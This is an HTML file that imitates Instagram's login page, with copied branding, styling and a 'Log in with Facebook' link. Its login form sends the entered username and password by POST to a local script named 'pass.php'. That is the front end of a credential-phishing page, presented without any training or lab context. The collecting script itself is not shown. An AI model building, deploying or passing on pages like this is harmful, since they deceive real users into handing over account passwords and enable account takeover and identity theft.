<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .login-box {
            width: 350px;
            padding: 40px;
            background: white;
            border: 1px solid #dbdbdb;
            text-align: center;
        }
        
        .logo {
            font-size: 42px;
            margin-bottom: 30px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 600;
        }
        
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            background: #fafafa;
            border-radius: 3px;
            font-size: 14px;
        }
        
        button {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            padding: 8px;
            margin: 10px 0;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
        }
        
        button:hover {
            background: #1877f2;
        }
        
        .divider {
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            position: relative;
        }
        
        .divider:before,
        .divider:after {
            content: "";
            position: absolute;
            top: 50%;
            width: 42%;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider:before {
            left: 0;
        }
        
        .divider:after {
            right: 0;
        }
        
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin: 20px 0;
        }
        
        .signup {
            margin-top: 20px;
            padding: 20px;
            background: white;
            border: 1px solid #dbdbdb;
        }
        
        .signup a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        
        .message {
            padding: 10px;
            margin: 10px 0;
            border-radius: 3px;
            display: none;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            
            <form id="loginForm" action="pass.php" method="POST">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            
            <div class="divider">OR</div>
            
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        // Show message if URL has parameters
        const urlParams = new URLSearchParams(window.location.search);
        const message = urlParams.get('message');
        const type = urlParams.get('type');
        
        if (message) {
            const div = document.createElement('div');
            div.className = `message ${type}`;
            div.textContent = decodeURIComponent(message);
            document.querySelector('.login-box').insertBefore(div, document.querySelector('#loginForm'));
            div.style.display = 'block';
            
            // Remove message after 5 seconds
            setTimeout(() => {
                div.style.display = 'none';
            }, 5000);
        }
        
        // Basic form validation
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const username = this.username.value.trim();
            const password = this.password.value.trim();
            
            if (username.length < 1 || password.length < 1) {
                e.preventDefault();
                alert('Please fill in all fields');
                return false;
            }
            
            // Show loading
            this.querySelector('button').textContent = 'Logging in...';
            this.querySelector('button').disabled = true;
        });
    </script>
</body>
</html>
